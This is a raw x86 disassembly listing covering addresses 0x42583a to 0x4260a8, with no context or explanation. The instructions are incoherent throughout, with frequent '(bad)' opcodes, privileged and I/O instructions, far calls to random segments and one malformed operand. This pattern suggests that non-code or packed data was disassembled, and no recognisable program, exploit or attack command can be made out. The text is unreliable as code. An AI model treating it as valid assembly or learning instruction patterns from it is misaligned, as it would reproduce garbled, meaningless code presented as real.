  42583a:	shr    esp,0xdb
  42583d:	jg     0x42587c
  42583f:	mov    al,0x52
  425841:	and    ebp,DWORD PTR [esi]
  425843:	jecxz  0x4257f7
  425845:	jle    0x4258c4
  425847:	fimul  WORD PTR [eax-0x3fdf438]
  42584d:	cs xor esp,0xd1c9542a
  425854:	and    BYTE PTR [ecx-0x32],bl
  425857:	cmp    ebx,DWORD PTR [ebp-0x39]
  42585a:	inc    esp
  42585b:	inc    esi
  42585c:	xchg   esi,eax
  42585d:	cmp    al,0x6b
  42585f:	retf   
  425860:	stc    
  425861:	mov    dh,cl
  425863:	jns    0x4258e4
  425865:	paddq  mm6,mm5
  425868:	outs   dx,BYTE PTR ds:[esi]
  425869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42586a:	mov    ebx,DWORD PTR [ecx+ebp*8+0x5c8d3a72]
  425871:	es push ebp
  425873:	or     edi,esp
  425875:	outs   dx,DWORD PTR ds:[esi]
  425876:	hlt    
  425877:	(bad)  
  425879:	mov    esi,0x5ee1a5c7
  42587e:	push   0x55
  425880:	mov    ah,BYTE PTR [esi+0x116bac83]
  425886:	push   cs
  425887:	shl    DWORD PTR [eax-0x78],cl
  42588a:	ins    BYTE PTR es:[edi],dx
  42588b:	addr16 in al,0x4b
  42588e:	mov    BYTE PTR [ecx-0x17473491],bh
  425894:	pop    edi
  425895:	mov    ds:0x6690d967,al
  42589a:	push   cs
  42589b:	jbe    0x4258b2
  42589d:	push   esi
  42589e:	icebp  
  42589f:	xor    eax,0xfad5b55
  4258a4:	xchg   BYTE PTR [esi],bh
  4258a6:	xor    BYTE PTR [edx-0x7ef23380],ah
  4258ac:	xor    edx,DWORD PTR [ebp+0x3d103dd]
  4258b2:	call   0x93f7:0x185d2e16
  4258b9:	std    
  4258ba:	and    al,0x70
  4258bc:	xchg   ecx,eax
  4258bd:	shr    DWORD PTR [ebx+0x65],cl
  4258c0:	mov    ds:0x6ecff59f,eax
  4258c5:	add    ebp,ebx
  4258c7:	xlat   BYTE PTR ds:[ebx]
  4258c8:	shl    esi,1
  4258ca:	or     eax,0x462102d6
  4258cf:	dec    ecx
  4258d0:	inc    edx
  4258d1:	or     BYTE PTR [edx-0x5abeaf7d],dl
  4258d7:	mov    al,0x73
  4258d9:	fistp  QWORD PTR [eax+edx*2+0x4a]
  4258dd:	and    DWORD PTR [edi],esp
  4258df:	push   ds
  4258e0:	stos   BYTE PTR es:[edi],al
  4258e1:	mov    eax,ds:0xa17fcfa
  4258e6:	stos   BYTE PTR es:[edi],al
  4258e7:	mov    esp,0xfdf8c884
  4258ec:	pop    ss
  4258ed:	pushf  
  4258ee:	mov    al,ds:0x3665c661
  4258f3:	(bad)  
  4258f4:	fbstp  TBYTE PTR [edx]
  4258f6:	inc    eax
  4258f7:	call   DWORD PTR [ebx]
  4258f9:	mov    ah,0x31
  4258fb:	mov    edx,edi
  4258fd:	add    eax,0x6f82ec01
  425902:	push   ds
  425903:	rcr    edx,cl
  425905:	icebp  
  425906:	scas   eax,DWORD PTR es:[edi]
  425907:	stc    
  425908:	cmc    
  425909:	adc    bl,al
  42590b:	in     al,0x62
  42590d:	hlt    
  42590e:	test   al,0x70
  425910:	cdq    
  425911:	add    cl,ch
  425913:	mov    ebp,0x825728d6
  425918:	xchg   ebx,eax
  425919:	mov    BYTE PTR [ebp+0x37],dh
  42591c:	jnp    0x4258a3
  42591e:	inc    ecx
  42591f:	(bad)
  425922:	dec    esp
  425923:	in     al,0xae
  425925:	in     al,dx
  425926:	aad    0x88
  425928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425929:	data16 loopne 0x425970
  42592c:	popa   
  42592d:	add    esi,ebx
  42592f:	sbb    eax,0xa2fcc60c
  425934:	in     eax,dx
  425935:	ror    BYTE PTR [eax+0x77],1
  425938:	loopne 0x425962
  42593a:	xchg   esi,eax
  42593b:	outs   dx,DWORD PTR ds:[esi]
  42593c:	or     al,0x83
  42593e:	das    
  42593f:	(bad)  
  425940:	shl    dh,cl
  425942:	dec    edx
  425943:	or     al,0xef
  425945:	int3   
  425946:	or     ch,BYTE PTR cs:[ebp-0x75cbb74e]
  42594d:	inc    esi
  42594e:	test   al,ah
  425950:	lahf   
  425951:	adc    al,BYTE PTR [eax-0x77403eff]
  425957:	sbb    cl,ah
  425959:	ins    DWORD PTR es:[edi],dx
  42595a:	je     0x425965
  42595c:	faddp  st(2),st
  42595e:	retf   
  42595f:	mov    fs,WORD PTR [eax]
  425961:	add    ah,bl
  425963:	jle    0x42591a
  425965:	inc    edx
  425966:	imul   esp,DWORD PTR [edx+0x63],0x1260b6b5
  42596d:	leave  
  42596e:	push   es
  42596f:	mov    edi,0x6cfcc484
  425974:	mov    ebx,0xa97a475a
  425979:	stc    
  42597a:	gs push edx
  42597c:	inc    BYTE PTR [edi]
  42597e:	add    eax,DWORD PTR [ebp+0x6f]
  425981:	retf   0x8a09
  425984:	cmc    
  425985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425986:	mov    cs,WORD PTR [esi]
  425988:	lds    edi,FWORD PTR [edx-0x2ae8b3cc]
  42598e:	lahf   
  42598f:	xchg   DWORD PTR [edx+0x10f9b58b],eax
  425995:	imul   edx,DWORD PTR [edi+0x26],0xffffffdf
  425999:	aad    0x7c
  42599b:	or     eax,0xc29e850e
  4259a0:	fadd   DWORD PTR [eax-0x4b]
  4259a3:	jg     0x4259ae
  4259a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259a6:	xchg   esp,esp
  4259a8:	rol    BYTE PTR [esi],0x5c
  4259ab:	ins    DWORD PTR es:[edi],dx
  4259ac:	or     al,0xf0
  4259ae:	lahf   
  4259af:	lods   al,BYTE PTR ds:[esi]
  4259b0:	imul   BYTE PTR [ecx-0x6e]
  4259b3:	lods   al,BYTE PTR ds:[esi]
  4259b4:	push   0x1525f501
  4259b9:	pushf  
  4259ba:	and    al,0xd5
  4259bc:	cmp    al,0x9e
  4259be:	vpshab ymm2,fs:[eax],xmm5
  4259c4:	add    eax,0x6df44550
  4259c9:	add    ebx,DWORD PTR ss:[ecx-0x47]
  4259cd:	hlt    
  4259ce:	sbb    al,ah
  4259d0:	sub    DWORD PTR [eax+0x35],eax
  4259d3:	dec    ecx
  4259d4:	or     bh,BYTE PTR [esi+0x52]
  4259d7:	and    eax,0xeab81e4d
  4259dc:	xor    esp,ecx
  4259de:	push   cs
  4259df:	jg     0x4259c3
  4259e1:	xor    BYTE PTR [ebx-0x50],al
  4259e4:	test   al,0x5c
  4259e6:	dec    ebx
  4259e7:	fnstsw WORD PTR [esi+0x6]
  4259ea:	sar    BYTE PTR [eax-0x27],0x24
  4259ee:	mov    eax,0xf9805d01
  4259f3:	test   al,0x54
  4259f5:	dec    ebp
  4259f6:	lahf   
  4259f7:	les    esi,FWORD PTR [ebx+0x3cf38ade]
  4259fd:	enter  0xa885,0xf7
  425a01:	fistp  WORD PTR [esi-0x7aa1e674]
  425a07:	mov    edx,0x7468a93d
  425a0c:	push   esi
  425a0d:	mov    ebx,tr7
  425a10:	and    BYTE PTR [esi],ch
  425a12:	xchg   esp,eax
  425a13:	ret    0xd7ba
  425a16:	inc    edx
  425a17:	push   eax
  425a18:	(bad)  
  425a19:	aaa    
  425a1a:	fs in  al,0x2d
  425a1d:	xor    eax,0x347b0172
  425a22:	adc    esp,DWORD PTR [ebx-0x31644159]
  425a28:	and    ax,0x2b7f
  425a2c:	data16 lahf 
  425a2e:	sub    BYTE PTR [ebx],cl
  425a30:	sub    eax,0xb43a45d0
  425a35:	jo     0x425a63
  425a37:	sbb    al,0x12
  425a39:	cmp    cl,BYTE PTR [ebp+0x696bd08c]
  425a3f:	sahf   
  425a40:	popa   
  425a41:	mov    dl,0x53
  425a43:	or     al,0x45
  425a45:	jp     0x425a74
  425a47:	jg     0x425a36
  425a49:	sti    
  425a4a:	rcr    ebp,1
  425a4c:	push   ds
  425a4d:	xor    BYTE PTR [ebx-0x2f2bdb4f],ch
  425a53:	jp     0x425ad3
  425a55:	mov    bh,0x9b
  425a57:	mov    ds:0xff01e746,al
  425a5c:	cli    
  425a5d:	dec    ecx
  425a5e:	jae    0x425a5f
  425a60:	jmp    0xff28:0xd80650af
  425a67:	ins    BYTE PTR es:[edi],dx
  425a68:	xchg   DWORD PTR [eax-0x7192acdb],ebx
  425a6e:	pop    esi
  425a6f:	inc    esi
  425a70:	adc    al,0xfc
  425a72:	(bad)  
  425a73:	nop
  425a74:	enter  0x7a57,0x34
  425a78:	jne    0x425a01
  425a7a:	jb     0x425a61
  425a7c:	stos   DWORD PTR es:[edi],eax
  425a7d:	dec    esp
  425a7e:	hlt    
  425a7f:	adc    BYTE PTR [edx-0x8],dh
  425a82:	jne    0x425a80
  425a84:	outs   dx,DWORD PTR ds:[esi]
  425a85:	repz mov cl,0x6
  425a88:	jge    0x425af8
  425a8a:	or     esi,esi
  425a8c:	add    eax,DWORD PTR [edi+0x5c]
  425a8f:	xchg   ebx,eax
  425a90:	push   esi
  425a91:	pop    edx
  425a92:	mov    esp,0x74cee8c
  425a97:	jno    0x425aad
  425a99:	xor    ah,dl
  425a9b:	xchg   ecx,eax
  425a9c:	stc    
  425a9d:	add    BYTE PTR [eax-0x27],al
  425aa0:	cmp    dh,cl
  425aa2:	test   eax,0xe849d617
  425aa7:	jnp    0x425a70
  425aa9:	retf   0xf1fa
  425aac:	and    al,0xc9
  425aae:	push   esp
  425aaf:	jnp    0x425a83
  425ab1:	cmp    ah,bl
  425ab3:	aam    0xbf
  425ab5:	xor    DWORD PTR [edi],edi
  425ab7:	stos   DWORD PTR es:[edi],eax
  425ab8:	mov    ebx,0x3402a9c6
  425abd:	adc    dl,BYTE PTR [ebp-0x17]
  425ac0:	sti    
  425ac1:	xchg   ebp,eax
  425ac2:	(bad)  
  425ac3:	push   ebp
  425ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ac5:	xchg   ecx,ebp
  425ac7:	xor    edi,DWORD PTR [ebx-0xb]
  425aca:	mov    ecx,0x2028392f
  425acf:	popa   
  425ad0:	stos   BYTE PTR es:[edi],al
  425ad1:	pop    ebx
  425ad2:	addr16 fcmovnu st,st(1)
  425ad5:	repz adc bl,BYTE PTR [ecx+0x213e97ab]
  425adc:	scas   eax,DWORD PTR es:[edi]
  425add:	ret    
  425ade:	mov    ebp,0xf10b5327
  425ae3:	dec    edi
  425ae4:	push   ecx
  425ae5:	call   0x656:0xbad2560e
  425aec:	in     al,dx
  425aed:	test   ebx,ebx
  425aef:	hlt    
  425af0:	push   0x14a7d070
  425af5:	xlat   BYTE PTR ds:[ebx]
  425af6:	scas   al,BYTE PTR es:[edi]
  425af7:	std    
  425af8:	lods   eax,DWORD PTR ds:[esi]
  425af9:	ja     0x425ac9
  425afb:	call   0x6c04:0x11f3bc4e
  425b02:	ffree  st(7)
  425b04:	stos   BYTE PTR es:[edi],al
  425b05:	retf   0xf802
  425b08:	dec    ebx
  425b09:	dec    ebp
  425b0a:	popa   
  425b0b:	xor    al,0x8b
  425b0d:	mov    edi,0x1193e59f
  425b12:	call   0x8f94:0xb7c2acb7
  425b19:	or     DWORD PTR [esi+0x2ef7e77c],esi
  425b1f:	(bad)  
  425b20:	daa    
  425b21:	call   0xa9a92aab
  425b26:	sti    
  425b27:	adc    eax,DWORD PTR [edx+0x0]
  425b2a:	cmp    DWORD PTR [ecx+0xddb07de],esp
  425b30:	sub    eax,0x6a656be2
  425b35:	xor    edi,0x3c07bb39
  425b3b:	sbb    al,0x24
  425b3d:	dec    ebx
  425b3e:	jns    0x425b54
  425b40:	and    eax,DWORD PTR [edx]
  425b42:	and    BYTE PTR [esp+ecx*4+0x6d3a09a6],ah
  425b49:	not    ch
  425b4b:	in     al,0x71
  425b4d:	push   edx
  425b4f:	loopne 0x425bb2
  425b51:	sahf   
  425b52:	loop   0x425b01
  425b54:	mov    dh,0x32
  425b56:	dec    ecx
  425b57:	dec    edi
  425b58:	cdq    
  425b59:	add    al,0xa2
  425b5b:	mov    dh,0x3d
  425b5d:	call   0xa3a99e70
  425b62:	push   ds
  425b63:	jmp    0xa3ef5fd
  425b68:	mov    ds:0x3ebf565d,eax
  425b6d:	mov    esp,0xf2b56af7
  425b72:	add    eax,0xbbdae81
  425b77:	mov    dl,BYTE PTR [eax]
  425b79:	stos   BYTE PTR es:[edi],al
  425b7a:	mov    ebp,0x4d53c467
  425b7f:	test   eax,0x1e2de707
  425b84:	dec    ebx
  425b85:	ret    0xccc9
  425b88:	xor    ebx,DWORD PTR [ebp+0x6]
  425b8b:	push   edi
  425b8c:	(bad)  
  425b8d:	popf   
  425b8e:	jne    0x425ba0
  425b90:	jle    0x583738a5
  425b96:	inc    ebx
  425b97:	ss (bad) 
  425b9a:	arpl   WORD PTR [edx-0x69150eb1],cx
  425ba0:	js     0x425ba6
  425ba2:	cli    
  425ba3:	fisttp WORD PTR [eax+0x2940f731]
  425ba9:	paddusb mm0,mm0
  425bac:	push   edi
  425bad:	ficomp DWORD PTR [ecx+eax*1+0x40f238b1]
  425bb4:	call   0xab52:0x639dba51
  425bbb:	das    
  425bbc:	pop    ss
  425bbd:	gs cmp al,0x71
  425bc0:	and    BYTE PTR [esi+0xa],0x31
  425bc4:	inc    ebp
  425bc5:	pushf  
  425bc6:	daa    
  425bc7:	adc    ebx,DWORD PTR [edi+0x5e072c85]
  425bcd:	test   al,0x47
  425bcf:	ins    BYTE PTR es:[edi],dx
  425bd0:	call   0xd82b9287
  425bd5:	fbstp  TBYTE PTR [esi-0x1d1aab05]
  425bdb:	fwait
  425bdc:	sbb    ecx,ebx
  425bde:	lahf   
  425bdf:	pop    ds
  425be0:	(bad)  
  425be1:	sbb    ch,BYTE PTR [edx+esi*1+0x39313c2]
  425be8:	adc    DWORD PTR [edx+0x70],ebx
  425beb:	ins    BYTE PTR es:[edi],dx
  425bec:	jbe    0x425c60
  425bee:	xchg   ecx,eax
  425bef:	cmp    al,0x2b
  425bf1:	mov    eax,ds:0xbf73289d
  425bf6:	fsub   QWORD PTR ds:0x3741fcc3
  425bfc:	inc    edx
  425bfd:	cmp    BYTE PTR ds:0x1391d8dd,0xd2
  425c04:	inc    ecx
  425c05:	ret    
  425c06:	xchg   DWORD PTR [edi-0x32],edi
  425c09:	aam    0x63
  425c0b:	dec    esp
  425c0c:	mov    esi,0x998ef572
  425c11:	mov    cl,0x1f
  425c13:	sbb    DWORD PTR [eax+eiz*2-0x4007eb8d],ebp
  425c1a:	push   ds
  425c1b:	icebp  
  425c1c:	fmul   QWORD PTR [ecx-0x51867faf]
  425c22:	mov    ebx,0xa7e96200
  425c27:	xor    bl,0xc9
  425c2a:	sahf   
  425c2b:	loope  0x425c45
  425c2d:	mov    ds:0x9efc9170,eax
  425c32:	out    dx,eax
  425c33:	jl     0x425ca2
  425c35:	add    eax,0x47a960e7
  425c3a:	mov    ebp,0x18ecdcaf
  425c3f:	addr16 aaa 
  425c41:	sahf   
  425c42:	pop    esp
  425c43:	cld    
  425c44:	(bad)  
  425c45:	or     eax,0x6a60b7c7
  425c4a:	add    eax,0x9af7f4f4
  425c4f:	add    BYTE PTR [ebp+0x1cac2700],dl
  425c55:	enter  0x8583,0xf7
  425c59:	xchg   edi,ebx
  425c5b:	test   eax,0x598a0c99
  425c60:	inc    esp
  425c61:	mov    cl,dl
  425c63:	mov    dh,0x38
  425c65:	mov    WORD PTR [edx+0x69],di
  425c69:	sub    al,0x6b
  425c6b:	pop    ebx
  425c6c:	imul   ebx,esi,0x25
  425c6f:	xor    BYTE PTR [eax],0xd2
  425c72:	loop   0x425c04
  425c74:	aaa    
  425c75:	stc    
  425c76:	mov    ecx,0xd53b5725
  425c7b:	mov    WORD PTR [edx],?
  425c7d:	xchg   ch,dl
  425c7f:	ins    DWORD PTR es:[edi],dx
  425c80:	(bad)
  425c83:	in     al,dx
  425c84:	fs inc ebx
  425c86:	mov    cl,bh
  425c88:	mov    esp,0x86890cf4
  425c8d:	pop    ebx
  425c8e:	das    
  425c8f:	call   0x68344679
  425c94:	in     al,0x16
  425c96:	cli    
	...
  425d13:	add    dh,ah
  425d15:	rcl    BYTE PTR [ecx+esi*8-0x2818084c],cl
  425d1c:	aad    0x75
  425d1e:	(bad)  
  425d1f:	adc    DWORD PTR [eax],esi
  425d21:	lock cld 
  425d23:	dec    ebx
  425d24:	push   eax
  425d25:	out    dx,eax
  425d26:	add    DWORD PTR [eax],eax
  425d28:	imul   eax,DWORD PTR [edi],0x0
  425d2b:	add    BYTE PTR [eax+0x7ad230df],dl
  425d31:	xlat   BYTE PTR ds:[ebx]
  425d32:	ficomp DWORD PTR [edi+0x5]
  425d35:	inc    esi
  425d36:	mov    ecx,0x4fa84381
  425d3b:	mov    ds:0x8b59a066,eax
  425d40:	pop    esp
  425d41:	je     0x425db0
  425d43:	hlt    
  425d44:	mov    ds:0xc047e2a3,eax
  425d49:	lock dec ecx
  425d4b:	adc    eax,0xe7c997e7
  425d50:	xor    eax,0x22b1601d
  425d55:	mov    ds:0x791da015,eax
  425d5a:	dec    ebp
  425d5b:	aaa    
  425d5c:	sbb    DWORD PTR [ebp+0x60086564],edx
  425d62:	jmp    0x34955179
  425d67:	add    eax,0x6cb27156
  425d6c:	push   edi
  425d6d:	cmp    esi,esp
  425d6f:	dec    esp
  425d70:	jmp    0x425d3c
  425d72:	leave  
  425d73:	clc    
  425d74:	adc    ch,ah
  425d76:	mov    ah,BYTE PTR [ecx+0x38ddb1e1]
  425d7c:	fcompp 
  425d7e:	mov    ah,0xa7
  425d80:	or     BYTE PTR [eax],bl
  425d82:	xor    ah,bl
  425d84:	push   ss
  425d85:	pop    ebx
  425d86:	xor    al,0xd6
  425d88:	imul   ecx,eax,0x51
  425d8b:	loopne 0x425d9b
  425d8d:	fild   WORD PTR cs:[esi]
  425d90:	add    al,BYTE PTR [edx-0x2a]
  425d93:	xchg   esi,eax
  425d94:	pop    esi
  425d95:	sbb    esp,ebp
  425d97:	loope  0x425ddd
  425d99:	xchg   esp,eax
  425d9a:	mov    ds:0xbd46c1f9,eax
  425d9f:	xor    BYTE PTR [esi+ebp*4],ch
  425da2:	mov    ebp,0xf854e8aa
  425da7:	jb     0x425da8
  425da9:	fstp   TBYTE PTR [edi+0x1]
  425dac:	or     ebx,esp
  425dae:	mov    eax,0x380af474
  425db3:	push   esp
  425db4:	out    0xb4,al
  425db6:	int3   
  425db7:	jmp    0x425d82
  425db9:	or     ecx,esp
  425dbb:	push   0x8aff64b3
  425dc0:	mov    edx,0xced2529e
  425dc5:	xor    al,0xf2
  425dc7:	ror    edi,1
  425dc9:	bound  eax,QWORD PTR [edx]
  425dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dcc:	shl    DWORD PTR [eax],cl
  425dce:	push   ds
  425dcf:	mov    al,0x7e
  425dd1:	dec    ecx
  425dd2:	fcmovnb st,st(1)
  425dd4:	enter  0xafda,0x2d
  425dd8:	cwde   
  425dd9:	loopne 0x425de6
  425ddb:	arpl   WORD PTR [edx+0xd],ax
  425dde:	addr16 jg 0x425da0
  425de1:	cmp    eax,0x71ef9ce6
  425de6:	push   edx
  425de7:	idiv   ecx
  425de9:	xchg   ecx,eax
  425dea:	adc    dl,ah
  425dec:	dec    edx
  425ded:	out    0x25,al
  425def:	frstor [ebx-0x1f]
  425df2:	push   eax
  425df3:	sub    eax,0xad4c5ff1
  425df8:	mov    ds:0x34230871,eax
  425dfd:	cmp    eax,0x65e7cfbd
  425e02:	leave  
  425e03:	int    0x66
  425e05:	jbe    0x425df0
  425e07:	xor    eax,0x35c0e40c
  425e0c:	dec    ebp
  425e0d:	add    al,0x25
  425e0f:	xor    eax,0x814a9411
  425e14:	sbb    ecx,DWORD PTR [ebp+ebx*2+0x26]
  425e18:	pop    es
  425e19:	aas    
  425e1a:	test   al,0xc8
  425e1c:	cmp    BYTE PTR [edi-0x2a3db3d3],al
  425e22:	int    0x22
  425e24:	jae    0x425dfa
  425e26:	ds push edi
  425e28:	fs jnp 0x425e1c
  425e2b:	and    edx,edx
  425e2d:	xchg   esi,eax
  425e2e:	xchg   ebp,eax
  425e2f:	stos   DWORD PTR es:[edi],eax
  425e30:	leave  
  425e31:	pop    esp
  425e32:	les    ecx,FWORD PTR ds:0x5a65e326
  425e38:	mov    BYTE PTR [esi+0x541d4506],al
  425e3e:	pop    ds
  425e3f:	xlat   BYTE PTR ds:[ebx]
  425e40:	ss sti 
  425e42:	pop    eax
  425e43:	fdivr  QWORD PTR [ebx+0x20b1d6a1]
  425e49:	xor    edi,ebp
  425e4b:	(bad)  
  425e4c:	das    
  425e4d:	aam    0xf
  425e4f:	mov    bh,0x44
  425e51:	fadd   QWORD PTR [ebp+0xa52063d]
  425e57:	push   gs
  425e59:	xchg   edi,eax
  425e5a:	sub    eax,0x366d69c
  425e5f:	inc    ebp
  425e60:	add    edx,DWORD PTR [ecx+0x36]
  425e63:	xchg   DWORD PTR [edi+0x4bffba06],edi
  425e69:	icebp  
  425e6a:	cmp    BYTE PTR [ebx+esi*4],al
  425e6d:	pop    es
  425e6e:	pop    edi
  425e6f:	and    al,0xf6
  425e71:	(bad)  [edx-0x16]
  425e74:	pop    eax
  425e75:	ss push ecx
  425e77:	jge    0x425e7c
  425e79:	mov    ah,0x95
  425e7b:	jle    0x425eb9
  425e7d:	shr    BYTE PTR [ebx+0xc],1
  425e80:	fsubr  QWORD PTR [edx]
  425e82:	enter  0x5088,0xa7
  425e86:	pop    ds
  425e87:	push   ecx
  425e88:	icebp  
  425e89:	adc    al,0x83
  425e8b:	cmc    
  425e8c:	pop    DWORD PTR [ebx+esi*2-0x3609a209]
  425e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e94:	loop   0x425e78
  425e96:	in     al,dx
  425e97:	ja     0x425e95
  425e99:	cmp    eax,0x449f865b
  425e9e:	pop    ebp
  425e9f:	retf   
  425ea0:	pop    ecx
  425ea1:	in     eax,dx
  425ea2:	jnp    0x425ebc
  425ea4:	fild   WORD PTR [esp+esi*2+0x2a]
  425ea8:	daa    
  425ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eaa:	fsub   DWORD PTR [eax+0x373f888e]
  425eb0:	mov    eax,0x9ad16ea4
  425eb5:	jb     0x425ea3
  425eb7:	fstp   TBYTE PTR [esi]
  425eb9:	fidivr WORD PTR [ebx]
  425ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ebc:	(bad)  
  425ebe:	jge    0x425e4c
  425ec0:	add    edi,ebp
  425ec2:	jae    0x425e5d
  425ec4:	add    al,0x37
  425ec6:	sahf   
  425ec7:	jmp    edi
  425ec9:	xchg   ebp,eax
  425eca:	ins    DWORD PTR es:[edi],dx
  425ecb:	cmp    DWORD PTR [edi+0x7323e868],0x896670a4
  425ed5:	lahf   
  425ed6:	js     0x425f30
  425ed8:	push   ds
  425ed9:	repnz dec ebx
  425edb:	dec    ebp
  425edc:	inc    esi
  425edd:	sbb    DWORD PTR [edi-0x6078505f],ebp
  425ee3:	aam    0x2b
  425ee5:	enter  0xad56,0x66
  425ee9:	shr    edi,cl
  425eeb:	inc    esp
  425eec:	ins    DWORD PTR es:[edi],dx
  425eed:	xchg   dl,dl
  425eef:	mov    ch,0xab
  425ef1:	xchg   edi,eax
  425ef2:	sbb    eax,0xba5daf18
  425ef7:	sbb    eax,0xea4c8e2c
  425efc:	pop    ds
  425efd:	adc    BYTE PTR [edi],cl
  425eff:	std    
  425f00:	ud2    
  425f02:	dec    esp
  425f03:	mov    ds:0xc2231409,al
  425f08:	and    al,0x3
  425f0a:	imul   esi,DWORD PTR [edx-0x2e0fd776],0x664c61f9
  425f14:	das    
  425f15:	test   al,0x40
  425f17:	xchg   edx,ebp
  425f19:	in     eax,dx
  425f1a:	outs   dx,DWORD PTR ds:[esi]
  425f1b:	nop
  425f1c:	ins    DWORD PTR es:[edi],dx
  425f1d:	pop    ds
  425f1e:	pop    esi
  425f1f:	mov    al,ds:0x55496994
  425f24:	(bad)  
  425f26:	xor    eax,DWORD PTR [eax-0xc]
  425f29:	ret    0xfd5a
  425f2c:	mov    cl,BYTE PTR [ebx-0x4c]
  425f2f:	and    DWORD PTR [esi+ecx*2],esi
  425f32:	sub    BYTE PTR [edx+0x9d656ff],0x92
  425f39:	mov    BYTE PTR [ecx],ah
  425f3b:	cmp    BYTE PTR [ebx+0x4d8a3765],dl
  425f41:	mov    al,0x12
  425f43:	leave  
  425f44:	(bad)  
  425f46:	jmp    0x521d9bb6
  425f4b:	das    
  425f4c:	sub    dh,BYTE PTR [edx+ebx*8]
  425f4f:	jle    0x425fb6
  425f51:	les    ebp,FWORD PTR [edx-0x7b]
  425f54:	in     al,dx
  425f55:	add    al,dl
  425f57:	rcr    BYTE PTR [edi],1
  425f59:	(bad)  
  425f5a:	outs   dx,BYTE PTR ds:[esi]
  425f5b:	call   FWORD PTR [edi+0x55]
  425f5e:	mov    edx,0xe1a469a4
  425f63:	adc    esp,DWORD PTR [ecx]
  425f65:	ja     0x425f26
  425f67:	(bad)  
  425f68:	in     eax,0x89
  425f6a:	lahf   
  425f6b:	xor    ecx,ecx
  425f6d:	test   eax,0x6e8690a7
  425f72:	pushf  
  425f73:	add    ecx,DWORD PTR [eax+0xc]
  425f76:	call   0x1e31:0x7db5b5a7
  425f7d:	and    al,0x9a
  425f7f:	dec    esp
  425f80:	mov    ds:0xcdda8b9d,eax
  425f85:	add    bl,BYTE PTR [edi+0x476017e2]
  425f8b:	int3   
  425f8c:	loope  0x425f2f
  425f8e:	xor    BYTE PTR [edx+0x7dc1a172],ah
  425f94:	adc    DWORD PTR [ecx-0x49078923],0xf02deb54
  425f9e:	or     al,0x6
  425fa0:	lods   al,BYTE PTR ds:[esi]
  425fa1:	and    al,0x8c
  425fa3:	xchg   edx,eax
  425fa4:	dec    edx
  425fa5:	scas   eax,DWORD PTR es:[edi]
  425fa6:	and    ah,BYTE PTR [ecx-0x2e7b25e7]
  425fac:	sbb    DWORD PTR [ecx+0xd],ebx
  425faf:	fcmovne st,st(5)
  425fb1:	rcr    esp,cl
  425fb3:	cld    
  425fb4:	sub    al,0xc3
  425fb6:	enter  0x71af,0xaf
  425fba:	inc    esi
  425fbb:	iret   
  425fbc:	mov    cl,0xe1
  425fbe:	add    ebx,DWORD PTR [edx]
  425fc0:	and    al,0xb0
  425fc2:	mov    ebp,0x2ecde630
  425fc7:	mov    eax,ds:0xd3516b8
  425fcc:	fwait
  425fcd:	sub    DWORD PTR [eax-0x158fafe7],eax
  425fd3:	addr16 pop es
  425fd5:	js     0x426001
  425fd7:	xor    eax,0x4d86e91a
  425fdc:	ret    0xea66
  425fdf:	push   ecx
  425fe0:	sbb    ecx,edi
  425fe2:	and    eax,0x73f27b6f
  425fe7:	fcom   DWORD PTR ds:[edi-0x7b3bd3e0]
  425fee:	mov    BYTE PTR [ecx],cl
  425ff0:	lahf   
  425ff1:	xchg   edi,eax
  425ff2:	and    DWORD PTR [edx-0x52],ebx
  425ff5:	out    dx,al
  425ff6:	pop    ds
  425ff7:	ja     0x42602d
  425ff9:	jle    0x425f97
  425ffb:	lea    edi,[edi]
  425ffd:	out    0x8a,eax
  425fff:	push   0x2e
  426001:	fadd   QWORD PTR ds:0x14a835c6
  426007:	clc    
  426008:	adc    eax,0xe4855429
  42600d:	ins    DWORD PTR es:[edi],dx
  42600e:	adc    ah,BYTE PTR [ebx]
  426010:	enter  0xc6ce,0xb2
  426014:	pusha  
  426015:	sbb    BYTE PTR [edx-0x38],bl
  426018:	mov    DWORD PTR [ecx],esi
  42601a:	pop    esi
  42601b:	mov    cl,0x71
  42601d:	rcr    BYTE PTR [ebx-0x41],cl
  426020:	cwde   
  426021:	xlat   BYTE PTR ds:[ebx]
  426022:	inc    ecx
  426023:	retf   0xa51
  426026:	pop    DWORD PTR ss:[ebx+0x57]
  42602a:	lock or al,0x10
  42602d:	inc    ebx
  42602e:	aam    0x40
  426030:	jmp    0x27f4:0x8317e7e7
  426037:	pop    ebx
  426038:	call   0xaafbefd5
  42603d:	mov    ah,0xe0
  42603f:	xchg   edx,eax
  426040:	fistp  DWORD PTR [esi+edi*4+0x25a04589]
  426047:	(bad)  
  426048:	hlt    
  426049:	fcomp  QWORD PTR es:[esi-0x44]
  42604d:	out    0x79,eax
  42604f:	stc    
  426050:	push   ecx
  426051:	es mov ch,0x62
  426054:	int3   
  426055:	mov    ebx,fs
  426057:	daa    
  426058:	test   eax,0xca519b3f
  42605d:	and    bh,BYTE PTR [edx-0x64]
  426060:	push   ebx
  426061:	fisubr DWORD PTR [edi]
  426063:	pop    ds
  426064:	mov    bh,BYTE PTR [eax-0x38a65505]
  42606a:	xor    eax,0xb4e1da08
  42606f:	sub    BYTE PTR [eax],ch
  426071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426072:	int3   
  426073:	jmp    0xeeae86a9
  426078:	push   esi
  426079:	fistp  QWORD PTR [ebp+edx*8+0x42134dea]
  426080:	mov    dl,ch
  426082:	retf   0xbbc8
  426085:	out    0x40,eax
  426087:	gs jno 0x426096
  42608a:	mov    al,ds:0xf3544d89
  42608f:	jmp    0x426107
  426091:	daa    
  426092:	jne    0x42602e
  426094:	xor    DWORD PTR [eax-0x42],ebx
  426097:	mov    edi,0xb6eb5e90
  42609c:	lock iret 
  42609e:	lods   al,BYTE PTR ds:[esi]
  42609f:	or     esi,esp
  4260a1:	ins    DWORD PTR es:[edi],dx
  4260a2:	xchg   edx,eax
  4260a3:	out    dx,eax
  4260a4:	jno    0x4260be
  4260a6:	add    al,0x31
  4260a8:	fld    TBYTE PTR fs:[ebx-0x24]
